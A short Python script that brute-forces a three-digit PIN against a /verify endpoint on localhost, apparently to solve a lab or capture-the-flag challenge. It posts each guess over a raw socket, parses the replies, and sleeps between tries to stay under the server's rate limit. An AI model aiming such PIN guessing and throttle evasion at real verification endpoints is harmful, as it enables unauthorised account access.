import socket
import time
import re

HOST = '127.0.0.1'
PORT = 8888

def send_request(pin):
    body = f"magicNumber={pin}"
    headers = (
        "POST /verify HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n"
        "User-Agent: BruteForceClient/1.0\r\n"
        "Accept: text/html\r\n"
        "\r\n"
    )
    request = headers + body

    with socket.create_connection((HOST, PORT)) as sock:
        sock.sendall(request.encode())
        response = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
    return response.decode(errors='ignore')

def clean_html(text):
    """Remove all HTML tags and get clean text only."""
    # Remove HTTP headers (anything before the first <body> tag)
    body_start = text.lower().find('<body>')
    if body_start != -1:
        text = text[body_start:]  # Strip everything before the body

    # Remove <script> and <style> contents
    text = re.sub(r'<(script|style).*?>.*?</\1>', '', text, flags=re.DOTALL)
    # Remove all other HTML tags
    text = re.sub(r'<[^>]+>', '', text)
    # Collapse multiple spaces
    text = re.sub(r'\s+', ' ', text)
    return text.strip()

def brute_force():
    for i in range(1000):
        pin = f"{i:03}"
        print(f"Trying PIN: {pin}")

        raw_response = send_request(pin)
        message = clean_html(raw_response)

        # Only show first 100 characters for debugging
        print(f"Server says: {message[:100]}")

        if "Incorrect number" in message:
            pass  # Still incorrect
        elif "Correct" in message or "Success" in message or "Welcome" in message:
            print(f"\n✅ Success! The correct PIN is: {pin}")
            break
        else:
            print(f"⚠️ Unexpected response for PIN {pin}")
            print(f"Full server message: {message}\n")  # <-- ADD THIS

        time.sleep(1)  # 1 second delay to avoid the server saying "slow down"

if __name__ == "__main__":
    brute_force()
